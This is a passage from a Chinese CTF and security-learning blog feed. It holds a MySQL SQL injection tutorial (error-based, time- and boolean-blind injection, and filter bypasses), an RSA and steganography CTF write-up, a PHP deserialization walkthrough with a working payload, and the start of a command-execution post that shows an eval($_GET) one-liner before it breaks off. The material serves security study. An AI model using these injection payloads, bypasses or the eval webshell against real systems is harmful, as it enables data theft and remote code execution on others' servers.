id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>堆叠查询可以执行多条SQL语句，之间用分号’;’隔开.与union select 联合查询不同，堆叠查询可以执行任何语句，而后者只能执行有限的(列数相同)。</p><pre><code>mysql&gt; show tables;+----------------+| Tables_in_ctf4 |+----------------+| admin           || news           |+----------------+2 rows in set (0.00 sec)mysql&gt; select * from admin;select * from news;+-----+-------+----------------------------------+| uid | name  | pass                              |+-----+-------+----------------------------------+|   1 | admin | 21232f297a57a5a743894a0e4a801fc3 |+-----+-------+----------------------------------+1 row in set (0.04 sec)+-----+--------+--------------------------+| tid | title  | content                    |+-----+--------+--------------------------+|   1 | heihei | 绂绘垚鍔熷張杩戜簡涓€姝?    ||   2 | haha   | 椹笂灏辨垚鍔熶簡          |+-----+--------+--------------------------+2 rows in set (0.03 sec)</code></pre><p>堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。做过的几道题都是用的MariaDB</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><ul><li>关键函数</li></ul><p>rand() 用于产生一个0~1的随机数</p><p>floor() 向下取整</p><p>rand()函数生成0~1的函数，使用floor()函数向下取整，值是固定的’0’，我们将rand*2，得到的值就是不固定的0或者1。</p><p>这里为什么不能直接用一个固定的常量比如1,0？而必须使用随机函数？因为我们需要使用函数在调用时会被执行的特点。</p><p>这是一句简单的查询语句</p><pre><code>select floor(rand(0)*2) from information_schema.tables;</code></pre><p>加上随机种子后是一个伪随机序列。同时这个报错也与数据量有关，这个我们下文会分析</p><p>伪随机的序列前几位是</p><pre><code>+------------------+| floor(rand(0)*2) |+------------------+|                0 ||                1 ||                1 ||                0 ||                1 ||                1 ||                0 ||                0 ||                1 ||                1 ||                1 ||                0 ||                1 ||                1 |</code></pre><p>我们使用count()和group by 来对结果进行统计，这里不加种子。</p><pre><code>select count(*) from information_schema.tables group by floor(rand()*2);+----------+| count(*) |+----------+|       47 ||       50 |+----------+</code></pre><p>经过测试发现不加种子也有出现报错的几率，但是我们加上种子之后必然会报错。在了解原因之前我们还要再了解一下count()函数</p><ul><li>count()</li></ul><p>在进行count时对查到的数据会创建一个虚拟表用来保存结果。如果key的结果在虚拟表中已经存在则count的结果加一，否则就插入新纪录。</p><p>由上文可知，floor(rand(0)*2)的结果是固定的’011011’，所以报错的原因应该是floor(rand(0)*2)的多次计算导致的。</p><pre><code>floor(rand(0*2)        0110110            查到0，虚拟表中不存在，执行插入1            插入insert floor(rand(0)*2) into tablename;插入时再次调用函数也就是说插入的是11            表中存在,count+10            查到0，不存在，进行插入1            插入insert floor(rand(0)*2) into tablename;插入时再次调用函数也就是说插入的是11            报错key            count1            1+11            报错</code></pre><p>从这里我们可以看到存在两个相同的key，主键唯一的，所以报错。表里有大于等于三条数据时就会报错。</p><p>那前面说的不加种子也有几率报错是为什么？</p><p>其实只要满足下面的条件就可以报错</p><pre><code>查询              虚拟表插入第一次计算         第二次计算第三次计算         第四次计算</code></pre><p>只要第三次结果与第二第四都不同，同时第二第四计算相同即可</p><p>我们构造下面的语句</p><pre><code>select count(*),concat(user(),floor(rand(0)*2)) x from information_schema.tables group by x;ERROR 1062 (23000): Duplicate entry &apos;root@localhost1&apos; for key &apos;group_key&apos;</code></pre><p>成功返回信息</p><p>如果不携带uesr()，报的是11，也就是说是concat()函数部分执行了语句</p><pre><code>select count(*) from information_schema.tables group by concat(1,floor(rand(0)*2));ERROR 1062 (23000): Duplicate entry &apos;11&apos; for key &apos;group_key&apos;</code></pre><ul><li>其他函数</li></ul><p>updataxml()</p><pre><code>select * from user where username = &apos;admin&apos; or updatexml(1,concat(0x7e,(database())),0);ERROR 1105 (HY000): XPATH syntax error: &apos;~test1&apos;</code></pre><p>因为第二个参数需要Xpath格式，输入不符合就报错，最大长度为32位,extractvalue()也是如此</p><p>extractvalue()</p><pre><code>select * from user where username = &apos;admin&apos; and extractvalue(1,concat(0x7e,(select database())))ERROR 1105 (HY000): XPATH syntax error: &apos;~test1&apos;</code></pre><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>主要两种，即 <strong>时间盲注</strong> ， <strong>布尔盲注</strong></p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>*<em>函数 *</em> </p><p>sleep() 睡眠时间为参数设定的秒数，然后返回0。若sleep()被中断，返回1。<br>假如这里我们有一张表</p><pre><code>mysql&gt; select * from user;+----+--------------------------------+----------+| id | username                       | password |+----+--------------------------------+----------+|  1 | admin                          | 1234567  ||  2 | 012345678901234567890123456789 | 1234567  ||  3 | 012345678901234567890123456789 | 1234567  ||  4 | admin                          | 11111    ||  5 | admin                          | 222222   ||  6 | admin                          | 33333    |+----+--------------------------------+----------+6 rows in set (0.00 sec)</code></pre><p>我们尝试查询一条数据并设置时间为3s</p><pre><code>select * from user where id = 1 and sleep(3);Empty set (3.00 sec)</code></pre><p>可以看到成功延时了3s.如果我们查一条表里不存在的数据，则会直接返回，不执行sleep()。</p><pre><code>select * from user where id = 9999 and sleep(3);Empty set (0.00 sec)</code></pre><p>and前面的条件为假，后面的就不再看了。同样的我们测试or</p><pre><code>select * from user where id = 1 or sleep(3);+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | admin    | 1234567  |+----+----------+----------+1 row in set (15.01 sec)</code></pre><p>发现时间为15s,我们可以想想表里一共有6条数据，查到第一条数据时id=1为真，此时or后面的表达式不再起作用，剩下的五条数据都为假，执行5次sleep(3),因此时间为15s。</p><p>*<em>配合if条件触发 *</em></p><p>if(expr1,expr2,expr3)<br>如果expr1是TRUE(expr1&lt;&gt;0 and expr1&lt;&gt; NULL),则IF()的返回值为expr2；否则返回值是expr3。IF()的返回值为数字或则字符串具体情况视其所在语境而定。</p><p>疑问 </p><pre><code>mysql&gt; select * from user where id = 7 or if(1,1,0);+----+--------------------------------+----------+| id | username                       | password |+----+--------------------------------+----------+|  1 | admin                          | 1234567  ||  2 | 012345678901234567890123456789 | 1234567  ||  3 | 012345678901234567890123456789 | 1234567  ||  4 | admin                          | 11111    ||  5 | admin                          | 222222   ||  6 | admin                          | 33333    |+----+--------------------------------+----------+6 rows in set (0.00 sec)mysql&gt; select * from user where id = 1 or if(1,1,0);+----+--------------------------------+----------+| id | username                       | password |+----+--------------------------------+----------+|  1 | admin                          | 1234567  ||  2 | 012345678901234567890123456789 | 1234567  ||  3 | 012345678901234567890123456789 | 1234567  ||  4 | admin                          | 11111    ||  5 | admin                          | 222222   ||  6 | admin                          | 33333    |+----+--------------------------------+----------+6 rows in set (0.00 sec)</code></pre><p>在不知道字段值的情况下可以通过此种方法得到内容</p><pre><code>mysql&gt; select * from user where username = &apos;&apos; or if(1,1,0);+----+--------------------------------+----------+| id | username                       | password |+----+--------------------------------+----------+|  1 | admin                          | 1234567  ||  2 | 012345678901234567890123456789 | 1234567  ||  3 | 012345678901234567890123456789 | 1234567  ||  4 | admin                          | 11111    ||  5 | admin                          | 222222   ||  6 | admin                          | 33333    |+----+--------------------------------+----------+6 rows in set (0.00 sec)</code></pre><p><strong>字符串截取函数</strong> </p><p>substr(str,postion,lines) 从str的第postion个字符开始截取lines长度的字符。</p><p>substring(str,FROM pos FOR len),这里可以不使用逗号。这两个函数如果我们不指定长度就会返回从查到的第一个字符开始的剩下所有字符。</p><p>substring_index(str,关键字，关键字出现次数)。返回str满足出现次数的之前的字符(如果第三个参数是负数则倒着来)</p><pre><code>mysql&gt; select * from user where username = &apos;&apos; or if(substr((select username from user where id=1),1,1)=&apos;a&apos;,sleep(2),0);Empty set (12.00 sec)</code></pre><p>如果id=1的这条数据第一个字符为’a’，则sleep2s.</p><pre><code>select * from user where id = 1 and if(ascii(substr(database(),1,1))=116,sleep(2),null);Empty set (2.00 sec)</code></pre><p>逐字符查询数据库名。</p><p><strong>配合 case when…then…else…end 触发</strong> </p><pre><code> select case when username = &apos;admin&apos; then &apos;admin&apos; else &apos;xxx&apos; end from user;+----------------------------------------------------------+| case when username = &apos;admin&apos; then &apos;admin&apos; else &apos;xxx&apos; end |+----------------------------------------------------------+| admin                                                    || xxx                                                      || xxx                                                      || admin                                                    || admin                                                    || admin                                                    |+----------------------------------------------------------+6 rows in set (0.00 sec)</code></pre><p><strong>除了sleep之外的函数</strong></p><p><strong>BENCHMARK(count,expr)</strong></p><p>BENCHMARK()函数重复count次执行expr。它可以被用于计算MYSQL处理表达式的速度。结果值通常为0。</p><pre><code>select benchmark(10000000,sha(1));</code></pre><p>我们结合上面的语句</p><pre><code>select * from user where id = 1 and if(ascii(substr(database(),1,1))=116,benchmark(10000000,sha(1)),null);</code></pre><p>*<em>笛卡尔积 *</em></p><pre><code>select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C;</code></pre><p>通过计算来延时</p><pre><code>mysql&gt; select count(*) from user;+----------+| count(*) |+----------+|        6 |+----------+1 row in set (0.00 sec)mysql&gt; select count(*) from user A,user B;+----------+| count(*) |+----------+       36 |+----------+1 row in set (0.00 sec)mysql&gt; select count(*) from user A,user B,user C;+----------+| count(*) |+----------+|      216 |+----------+1 row in set (0.00 sec)例如：select * from user where id = 1 and if(ascii(substr(database(),1,1))=116,(select count(*) from information_schema.tables A,information_schema.tables B,information_schema.columns C),null);</code></pre><p>*<em>GET_LOCK *</em></p><p>GET_LOCK(str,timeout)</p><p>设法使字符串str给定的名字得到一个锁，超时为timeout秒.</p><p>select GET_LOCK(‘a’,1)</p><p>但是上锁后必须在使用长连接能开启两个会话的时候才起作用。</p><p>*<em>RLIKE *</em></p><p>通过rpad或repeat 构造长字符串，加以计算量大的pattern，通过repeat的参数控制延时长短。</p><p>   <code>select concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;;</code></p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p><strong>函数</strong> </p><p>截取函数</p><pre><code>mid(column_name,start[,length])mysql&gt; select mid(&apos;abc&apos;,1,1);+----------------+| mid(&apos;abc&apos;,1,1) |+----------------+| a              |+----------------+1 row in set (0.00 sec)left(str,lengt) 从左开始截取字符串right(str,length) 从右截取 mysql&gt; select right(&apos;abcda&apos;,3);+------------------+| right(&apos;abcda&apos;,3) |+------------------+| cda              |+------------------+1 row in set (0.00 sec)转ascii类型ascii(str)/ord(str)  返回字符串首字母的ascii值</code></pre><p>布尔盲注与时间盲注差别不大</p><p>常用payload </p><pre><code>ascii(substr((select password from user) from 1 for 1))&lt;127</code></pre><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="关键词过滤"><a href="#关键词过滤" class="headerlink" title="关键词过滤"></a>关键词过滤</h3><p>对于某些特定关键词过滤比如 from,union,select等我们可以通过双写或大小写混写进行绕过。</p><p>空格绕过： /**/ /*!*/  %09 %0A %0B %0C %0D %A0 %20</p><p>在实际使用中我们也可以使用1个<code>*/</code>来闭合多个<code>/*!</code>.</p><pre><code>SELECT * from users where id = 1/*!union/*!select/*!1,(select/*!password/*!from/*!users/*!limit/*!1,1),3*/;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | Dumb         | Dumb      ||  1 | I-kill-you | 3         |+----+------------+----------+</code></pre><p>函数替换：</p><pre><code>mid(&apos;aaa&apos;,1,1) &lt;==&gt; left(&apos;aaa&apos;,1) &lt;==&gt; substr(&apos;aaa&apos;,1,1) &lt;==&gt; substring(&apos;aaa&apos;,1,1)concat(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;) &lt;==&gt; group\_concat(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;) &lt;==&gt;  concat\_ws(&apos;b&apos;,&apos;a&apos;,&apos;c&apos;)</code></pre><p>逗号绕过：</p><p>union select 联合查询的逗号被过滤时我们可以使用<code>join</code>进行注入</p><pre><code>select * from emails where id = 1.1 union select * from (select 1)a join (select 2)b;</code></pre><p>字符串截取函数中的逗号绕过</p><p>m<code>id(&#39;abc&#39; from 1 for 1) &lt;==&gt; substr(&#39;abc&#39; from 1 for 1) &lt;==&gt; substring(&#39;abc&#39; from 1 for 1)</code></p><p>Limit中逗号绕过</p><pre><code>select * from emails limit 1,1; &lt;==&gt; select * from emails limit 1 offset 1;</code></pre><p><code>=</code>绕过</p><p>可以用like、regexp、rlike、in、between…and…绕过</p><p>比较符绕过<br>！= &lt;==&gt; &lt;&gt;</p><h3 id="关键函数过滤"><a href="#关键函数过滤" class="headerlink" title="关键函数过滤"></a>关键函数过滤</h3><p>如果过滤了<code>information</code>关键字无法使用<code>information_schema.tables</code>等表的话我们可以通过innodb引擎进行注入。 在Mysql5.6以上版本中，系统Mysql库中存在两张与innodb相关的表 <code>innodb_table_stats</code> 和 <code>innodb_index_stats</code>。</p><pre><code>select group_concat(table_name) from mysql.innodb_table_stats where database_name=database();select group_concat(table_name) from mysql.innodb_index_stats where database_name=database();</code></pre><p>同时我们也可以通过查询一个不存在的自定义函数来获得数据库名</p><pre><code>select * from users where id=haa();ERROR 1305 (42000): FUNCTION security.haa does not exist</code></pre><p>爆列名使用<code>polygon</code>和<code>linestring</code>函数。翻阅文档可知</p><blockquote><p>Constructs a Polygon value from a number of LineString or WKB LineString arguments. If any argument does not represent a LinearRing (that is, not a closed and simple LineString), the return value is NULL. </p></blockquote><p>如果我们传入存在字段的话就会爆出库，表，列。</p><pre><code>mysql&gt; select * from users where id=1 and polygon(id);ERROR 1367 (22007): Illegal non geometric &apos;`security`.`users`.`id`&apos; value found during parsingmysql&gt; select * from users where id=1 and linestring(id);ERROR 1367 (22007): Illegal non geometric &apos;`security`.`users`.`id`&apos; value found during parsing</code></pre><p>爆字段名我们通过命名别名的方式。使用别名的时候表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错，从而爆出字段名，再使用<code>using</code>函数以此爆出其他字段名。</p><pre><code>mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b)as c);ERROR 1060 (42S21): Duplicate column name &apos;id&apos;mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b using(id))as c);ERROR 1060 (42S21): Duplicate column name &apos;username&apos;mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b using(id,username))as c);ERROR 1060 (42S21): Duplicate column name &apos;password&apos;mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b using(id,username,password))as c);ERROR 1241 (21000): Operand should contain 1 column(s)</code></pre><p>如果过滤了字段名，比如 password 我们可以通过以下方法得到数据</p><pre><code>mysql&gt; select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)e;+------------+| 3           |+------------+| 3           || Dumb        || I-kill-you || p@ssword   || crappy      || stupidity  || genious     || mob!le      || admin       || admin1      || admin2      || admin3      || dumbo       || admin4      || 789          |+------------+mysql&gt; select * from users where id=1 union select 1,(select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)e limit 1 offset 2),3;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | Dumb         | Dumb      ||  1 | I-kill-you | 3         |+----+------------+----------+</code></pre><p>原理是通过建立虚表e，虚表e里的第三列储存了password字段信息，我们通过偏移来使该字段信息显示在没被过滤的username字段中。</p><p>还有一种方法是盲注</p><p>现在我们的表里有一条数据</p><pre><code>mysql&gt; select * from users where id=15;+----+----------+----------+| id | username | password |+----+----------+----------+| 15 | admin#   | 789  |+----+----------+----------+</code></pre><p>我们通过盲注的方式进行查询。</p><pre><code>mysql&gt; select * from users where id=15 union select 1,2,0x38 order by 3 desc;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | 2        | 8        || 15 | admin#   | 789      |+----+----------+----------+2 rows in set (0.00 sec)    mysql&gt; select * from users where id=15 union select 1,2,0x37 order by 3 desc;+----+----------+----------+| id | username | password |+----+----------+----------+| 15 | admin#   | 789  ||  1 | 2| 7|+----+----------+----------+2 rows in set (0.00 sec)mysql&gt; select * from users where id=15 union select 1,2,0x36 order by 3 desc;+----+----------+----------+| id | username | password |+----+----------+----------+| 15 | admin#   | 789      ||  1 | 2        | 6        |+----+----------+----------+2 rows in set (0.00 sec)</code></pre><p>order by 3 desc 表示对第三栏进行降序排列。而mysql在比较的时候是从左到右按照字符的ASCII码来比较。</p><p>从结果我们可以看出union select 0x38 时username 回显2,union select 0x37 时username 回显 admin#,union select 0x36时 username 回显admin#,也就是说password的第一位是0x37，也就是7.于是，我们可以通过写脚本来爆破这个位置的值。</p><p>参考链接</p><blockquote><p><a href="https://www.secpulse.com/archives/68991.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/68991.html</a></p><p><a href="https://xz.aliyun.com/t/5505#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/5505#toc-3</a></p><p><a href="https://xz.aliyun.com/t/253" target="_blank" rel="noopener">https://xz.aliyun.com/t/253</a></p><p><a href="http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/" target="_blank" rel="noopener">http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>peaCTF WP</title>
      <link href="/2019/07/26/peaCTF-WP/"/>
      <url>/2019/07/26/peaCTF-WP/</url>
      
        <content type="html"><![CDATA[<p>和同学报名了这个比赛，全英文果然有压力，半天找不到怎么答题，哭了😭</p><a id="more"></a><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>题目描述：Can you help Bob retrieve the two messages for a flag? Authenticated Channel Encrypted Channel</p><p>给了两个文件 auth_channel.txt 和  enc_channel.txt</p><pre><code>Authenticated (unhashed) channel:n = 59883006898206291499785811163190956754007806709157091648869e = 65537c = 23731413167627600089782741107678182917228038671345300608183Encrypted channel:n = 165481207658568424313022356820498512502867488746572300093793e = 65537c = 150635433712900935381157860417761227624682377134647578768653</code></pre><p>先分解两个n得到两对p&amp;q</p><pre><code>p = 192355607880290234740980693973q = 311314068553039667905603427153p1 = 404796306518120759733507156677q1 = 408801179738927870766525808109</code></pre><p>对两个文件分别进行常规解密</p><pre><code>import gmpy2n1 = 165481207658568424313022356820498512502867488746572300093793e1 = 65537c1 = 150635433712900935381157860417761227624682377134647578768653p1 = 404796306518120759733507156677q1 = 408801179738927870766525808109phin1 = (p-1)*(q-1)d1 = gmpy2.invert(e,phin)m1 = gmpy2.powmod(c,d,n)print mflag = hex(m)[2:]print flag.decode(&apos;hex&apos;)</code></pre><p>发现只有第二个文件可以正常解密</p><pre><code>8904929771347223901285886734450peaCTF{f4ct0r</code></pre><p>第一个文件报错，奇数长度无法正常decode。</p><p>这个地方卡了一会，还尝试拼接了两段m，哈哈。</p><p>最后看文件名发现是auth，想到RSA数字签名，尝试数字签名解，打印出pow的16进制数据后在数据最后有一个大写的L<code>0x316e67317366756e7dL</code>，遂删掉。将新得到的数据再次解密得到flag的后半段。</p><pre><code>peaCTF{f4ct0r1ng1sfun}</code></pre><h2 id="The-Wondeful-Wizard"><a href="#The-Wondeful-Wizard" class="headerlink" title="The Wondeful Wizard"></a>The Wondeful Wizard</h2><p>打开文件就是一张图片，图片扔进stegslove里跑一下各通道，在蓝色通道发现三行字符串，明显的16进制，试了试解前两个发现是fl,于是菜鸡的我手敲进代码里进行16进制解密</p><p>运行结果：</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5kb70a11oj30ki0kp41e.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>序列化与反序列化</title>
      <link href="/2019/03/23/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2019/03/23/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>老生长谈了，可是我还是不会</p><a id="more"></a><h2 id="0x01为什么要序列化"><a href="#0x01为什么要序列化" class="headerlink" title="0x01为什么要序列化"></a>0x01为什么要序列化</h2><p>php允许保存一个对象方便以后重用，这个过程称为序列化。在传递变量的过程中有可能遇到变量值跨脚本传输的过程。比如文件结构是这样的：</p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5kawe13ecj305w03nt8i.jpg" alt></p><p>其中index.php代码如下：</p><pre><code>&lt;?php @highlight_file(__FILE__);require_once(&apos;shield.php&apos;);$x = new Shield();isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];if (!empty($g)) {    $x = unserialize($g);}echo $x-&gt;readfile();?&gt;</code></pre><p>可以看出来$x就是跨脚本传输的变量。</p><p>如果在一个脚本调用跨脚本传输的变量之前，前一个包含该变量的脚本已经执行结束所有的变量和内容都已经释放掉了，这时，我们不能让前一个脚本不断循环执行等待后面的脚本去调用。serialize和unserialize 就是解决这一问题的。serialize将变量转换为字符串并且在转换过程中保存当前变量的值;unserialize则将serialize生成的字符串变回成变量。</p><p>看一个例子，简单的分析一下：</p><pre><code>&lt;?phpclass Test{public $age = 0;public $name = &apos;brain&apos;;public function PrintInfo(){    echo &apos;[+]User: &apos;.$this-&gt;name .&apos;: is&apos; . $this-&gt;age .&apos;years old.&apos;;}}$user =  new Test();$user-&gt;age = 20;$user-&gt;name = &apos;Jack&apos;;$user-&gt;PrintInfo();echo serialize($user);?&gt;</code></pre><p>输出结果如下</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5kawi4ovpj30p204wdg5.jpg" alt></p><p>使用unserialize则会使这串<strong>字符串</strong>恢复成<strong>类对象</strong>。</p><h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><p>一共有几个魔法函数需要注意，这是例子：</p><pre><code>&lt;?phpclass Test{public $variable = &quot;BRAIN&quot;;public $variable1 = &quot;BRAVO&quot;;public function PrintVariable(){    echo $this-&gt;variable . &apos;&lt;br /&gt;&apos;;}public function __construct(){    echo &apos;__construct&apos;.&apos;&lt;br&gt;&apos;;}public function __destruct(){    echo &apos;__destruct&lt;br /&gt;&apos;;}public function __wakeup(){    echo &apos;__wakeup&lt;br /&gt;&apos;;}public function __sleep(){    echo &apos;__sleep&lt;br /&gt;&apos;;    return array(&apos;variable&apos; , &apos;variable1&apos;);}}    $obj = new Test();  //创建对象时调用__construct$serialized = serialize($obj); //序列化对象时调用__sleepprint(&apos;Serialized: &apos;.$serialized . &apos;&lt;br /&gt;&apos;);$obj2 = unserialize($serialized); //重建对象调用 __wakeup$obj2-&gt;PrintVariable(); //调用方法输出数据//脚本结束调用__destruct?&gt;</code></pre><p>这是执行结果：</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5kawmc729j30h504a746.jpg" alt></p><p>可以看到各个函数的执行顺序。</p><h2 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h2><p>反序列化的危害就在于反序列化后的字符串参数被用户可控，从而在序列化之后造成不可预料的问题。</p><p>拿一道ctf题举例，文件结构就是文章开头提到的结构</p><pre><code>    idnex.php&lt;?php @highlight_file(__FILE__);require_once(&apos;shield.php&apos;);$x = new Shield();isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];if (!empty($g)) {    $x = unserialize($g);}echo $x-&gt;readfile();?&gt;shield.php&lt;?php//flag is in pctf.phpclass Shield {    public $file;    function __construct($filename = &apos;&apos;) {        $this -&gt; file = $filename;    }    function readfile() {        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE          &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {            return @file_get_contents($this-&gt;file);        }    }}?&gt;</code></pre><p>我们可以看到index.php中先包含了shield.php，然后创建了一个新对象，在判断完get的变量之后进行反序列化，随后调用readfile()函数。<br>在shield.php中提示flag在pctf.php中，随后在readfile()函数中对$file进行一定过滤之后读文件内容。</p><p>我们的想法就是控制$file的值为pctf.php</p><pre><code>&lt;?php//flag is in pctf.phpclass Shield {    public $file;    function __construct($filename = &apos;&apos;) {        $this -&gt; file = $filename;    }    function readfile() {        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE          &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {            return @file_get_contents($this-&gt;file);        }    }}$a = new Shield(&quot;pctf.php&quot;);echo serialize($a);?&gt;序列化结果O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>然后我们就可以尝试传入这个字符串</p><pre><code>class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>就可以在源码中看到flag.</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5kawpcjn0j30br08twep.jpg" alt></p><h2 id="ROP-Return-Oriented-programming-链"><a href="#ROP-Return-Oriented-programming-链" class="headerlink" title="ROP(Return-Oriented programming)链"></a>ROP(Return-Oriented programming)链</h2><p>这道题的攻击链比较简单。当我们传入序列化完成的字符串后，程序先对其反序列化生成一个对象，这时没有_wakeup()，_destruct()魔法函数，只是简单的反序列化，之后调用readfile()函数进行$file的内容的读取，而我们将$file的值设置为了pctf.php，于是我们得到了该文件的内容。<br>反序列化漏洞需要两个条件：</p><blockquote><p>1.存在序列化字符串的可控制点或者说是输入点</p><p>2.存在可以利用的魔法函数</p></blockquote><p>这道题目对魔法函数的利用好像不是很明显.(ε=ε=ε=┏(゜ロ゜;)┛)</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> serialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行漏洞(Command Execution)</title>
      <link href="/2019/03/23/Command-Execution/"/>
      <url>/2019/03/23/Command-Execution/</url>
      
        <content type="html"><![CDATA[<p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system,exec,shell_exec等，当用户可以执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行漏洞。</p><a id="more"></a><h2 id="漏洞概念"><a href="#漏洞概念" class="headerlink" title="漏洞概念"></a>漏洞概念</h2><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system,exec,shell_exec等，当用户可以执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行漏洞。</p><h2 id="要区别命令执行漏洞和代码执行漏洞"><a href="#要区别命令执行漏洞和代码执行漏洞" class="headerlink" title="要区别命令执行漏洞和代码执行漏洞"></a>要区别命令执行漏洞和代码执行漏洞</h2><p><strong>命令执行漏洞直接调用操作系统命令</strong></p><p><strong>原理</strong>：在操作系统中”&amp;,|,||”都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令</p><p><strong>代码执行漏洞靠执行脚本代码调用系统命令</strong></p><p><strong>原理</strong>：应用有时现需要调用一些执行系统命令的函数，如PHP中的system,exec,shell_exec,passthru,popen,proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而执行攻击。</p><h2 id="linux的特殊字符"><a href="#linux的特殊字符" class="headerlink" title="linux的特殊字符"></a>linux的特殊字符</h2><ol><li><p>‘;’的用法</p><p> 先执行它之前的命令，知道前面的命令执行完（无论对与错）就立即执行后面的命令。</p></li><li><p>‘|’的用法</p><p> 上一条命令的输出，作为下一条命令的参数</p></li><li><p>‘&amp;&amp;’的用法</p><p> 只用前面的命令执行成功，才能执行后面的命令</p></li></ol><h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><p>8/20/2019 7:32:16 PM </p><h3 id="php代码执行"><a href="#php代码执行" class="headerlink" title="php代码执行"></a>php代码执行</h3><p>eval()</p><blockquote><p>eval — 把字符串作为PHP代码执行</p></blockquote><pre><code>mixed eval( string $code)&lt;?php    eval($_GET[&apos;a&apos;]);    